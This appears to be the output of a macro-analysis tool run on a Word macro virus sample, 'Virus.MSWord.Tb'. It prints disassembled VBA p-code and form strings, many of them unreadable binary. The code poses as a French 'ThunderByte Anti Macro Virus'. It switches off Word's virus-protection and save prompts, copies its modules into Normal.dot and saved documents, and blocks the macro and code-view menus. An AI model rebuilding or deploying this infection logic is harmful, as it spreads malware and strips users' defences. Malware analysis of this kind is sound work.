' Line #130:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #131:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000E "ThunderByteAMV"
' 	Eq 
' 	IfBlock 
' Line #132:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ThunderByteAMVInstalled 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	Ld ThunderByteAMVInstalled 
' 	Not 
' 	IfBlock 
' Line #136:
' 	Ld Installation 
' 	ArgsMemCall Show 0x0000 
' Line #137:
' 	LitStr 0x0018 "Installation en cours..."
' 	St StatusBar 
' Line #138:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000E "ThunderByteAMV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #139:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "Installation"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #140:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Protection"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #141:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "ATBAMV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #142:
' 	LitStr 0x0014 "Installation terminé"
' 	St StatusBar 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	Label ErrorAO 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub FileSaveAs())
' Line #147:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #148:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #149:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #150:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #151:
' 	OnError ErrorFSA 
' Line #152:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #153:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #154:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000E "ThunderByteAMV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #157:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "Installation"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #158:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Protection"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #159:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "ATBAMV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #160:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #161:
' 	Label ErrorFSA 
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub FileTemplates())
' Line #164:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #165:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #166:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #167:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #168:
' 	OnError ErrorFT 
' Line #169:
' 	LitStr 0x002D "ThunderByte protège l'accès de certains menus"
' 	Ld vbInformation 
' 	LitStr 0x001C "ThunderByte Anti Macro Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #170:
' 	Label ErrorFT 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub Renommer())
' Line #173:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #174:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #176:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #177:
' 	OnError ErrorRN 
' Line #178:
' 	Dim 
' 	VarDefn NH
' 	VarDefn Valeur
' Line #179:
' 	ArgsCall Read 0x0000 
' Line #180:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #181:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St NH$ 
' Line #182:
' 	Ld NH$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St Valeur 
' 	EndIf 
' Line #183:
' 	Ld NH$ 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "ç"
' 	St Valeur 
' 	EndIf 
' Line #184:
' 	Ld NH$ 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "ù"
' 	St Valeur 
' 	EndIf 
' Line #185:
' 	Ld NH$ 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "é"
' 	St Valeur 
' 	EndIf 
' Line #186:
' 	Ld NH$ 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "m"
' 	St Valeur 
' 	EndIf 
' Line #187:
' 	Ld NH$ 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "y"
' 	St Valeur 
' 	EndIf 
' Line #188:
' 	Ld NH$ 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "z"
' 	St Valeur 
' 	EndIf 
' Line #189:
' 	Ld NH$ 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "b"
' 	St Valeur 
' 	EndIf 
' Line #190:
' 	Ld NH$ 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "è"
' 	St Valeur 
' 	EndIf 
' Line #191:
' 	Ld NH$ 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "f"
' 	St Valeur 
' 	EndIf 
' Line #192:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St a$ 
' 	EndIf 
' Line #193:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St B$ 
' 	EndIf 
' Line #194:
' 	Ld i 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St c$ 
' 	EndIf 
' Line #195:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St d$ 
' 	EndIf 
' Line #196:
' 	Ld i 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St e$ 
' 	EndIf 
' Line #197:
' 	Ld i 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St False$ 
' 	EndIf 
' Line #198:
' 	Ld i 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St g$ 
' 	EndIf 
' Line #199:
' 	Ld i 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur 
' 	St h$ 
' 	EndIf 
' Line #200:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #201:
' 	Ld a$ 
' 	Ld B$ 
' 	Add 
' 	Ld c$ 
' 	Add 
' 	Ld d$ 
' 	Add 
' 	Ld e$ 
' 	Add 
' 	Ld False$ 
' 	Add 
' 	Ld g$ 
' 	Add 
' 	Ld h$ 
' 	Add 
' 	St Nom$ 
' Line #202:
' 	LitStr 0x0008 "Renommer"
' 	LitStr 0x0003 "Nom"
' 	Ld Nom$ 
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #203:
' 	Label ErrorRN 
' Line #204:
' 	EndSub 
' Line #205:
' 	FuncDefn (Sub ToolsMacro())
' Line #206:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #207:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #208:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #209:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #210:
' 	OnError ErrorTM 
' Line #211:
' 	LitStr 0x0022 "Protection Anti Macro Virus activé"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000C "Accès refusé"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x001C "ThunderByte Anti Macro Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #212:
' 	Label ErrorTM 
' Line #213:
' 	EndSub 
' Line #214:
' 	FuncDefn (Sub ViewVBCode())
' Line #215:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #216:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #217:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #218:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #219:
' 	OnError ErrorVVBC 
' Line #220:
' 	LitStr 0x000F "Menu protégé..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000C "Accès Refusé"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x001C "ThunderByte Anti Macro Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #221:
' 	Label ErrorVVBC 
' Line #222:
' 	EndSub 
' Macros/VBA/Protection - 1668 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld Protection 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Userform_initialize())
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Virus de macro d�tect�!!!!!!!!!!!!!!!..
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Type:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Inconnu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom:O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Que voulez-vous faire ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�parer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Continuer�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Renommer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Supprimer le ou les fichiers infect�(s)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Choisir une option puis cliquer sur OK pour confirmer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/ATBAMV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF87a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����#'�JN����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TT�16���|io���g $�sx�rr������,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I��8�ͻ� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�di�h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/���j�oN�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߫	pH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�\2�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gV��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%L^-�ѴZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��|^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�x�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p|�|?D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�.h�Jm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W���ld
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Q~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��]�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���sl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���i`�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������x�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���qGC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xԡ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oGՓ����d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����׆
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<�hAPF���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.RiwAU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')c>�(�F�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͐�V2��Bc��i~�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��7

<=����L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U����ר\�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�Ŝ;%�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'X5v���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AY$y�ܝZ$�S��t6D�P�ޙh�>V"tb_�(���<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���]h̝
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�����z
��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J��mڳ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�=�6��$���}���㶏
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7k��i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��墖J���R?��<F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
缑Ӯl3=�ߋ�@�=������)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�UU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���Y	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ъ{�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ay�����a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`���Y�ˏ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�Hۅ�ԡ�SU
-------------------------------------------------------------------------------
